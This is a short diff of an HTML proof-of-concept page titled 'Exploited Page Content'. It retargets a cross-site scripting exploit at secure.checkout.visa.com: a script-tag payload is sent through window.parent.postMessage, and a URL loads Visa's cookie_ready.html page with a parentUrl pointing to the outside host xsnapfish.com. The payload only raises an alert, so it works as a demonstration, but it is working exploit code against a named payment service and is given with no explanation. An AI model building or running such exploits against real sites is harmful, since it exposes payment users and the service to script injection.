@@ -9,9 +9,9 @@
     <h1>Exploited Page Content</h1>
     <script>
         function exploit() {
-            var payload = "<script>alert('XSS from the exploited page');</script>";
+            var payload = "<script>alert('XSS from secure.checkout.visa.com');</script>";
             // Send payload to the parent window
-            window.parent.postMessage(payload, '*');
+            window.parent.postMessage(payload, 'https://secure.checkout.visa.com');
         }
     </script>
     <!-- Trigger the exploit onload -->
@@ -49,7 +49,7 @@
         createCookie('ready', 'ready');
 
         var data = [],
-            url = "https://xsnapfish.com/visa.html";
+            url = "https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa.html";
 
         if (getCookie('ready') === 'ready'){
             data.push('ready');
